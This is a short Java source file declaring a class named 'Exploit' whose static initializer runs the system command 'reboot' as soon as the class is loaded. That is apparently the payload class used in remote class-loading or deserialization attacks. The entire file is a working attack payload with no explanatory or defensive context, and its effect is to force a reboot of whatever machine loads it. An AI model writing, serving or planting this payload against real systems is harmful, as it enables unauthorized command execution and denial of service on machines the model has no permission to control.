public class Exploit {
	static {
		try {
			Runtime.getRuntime().exec("reboot");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
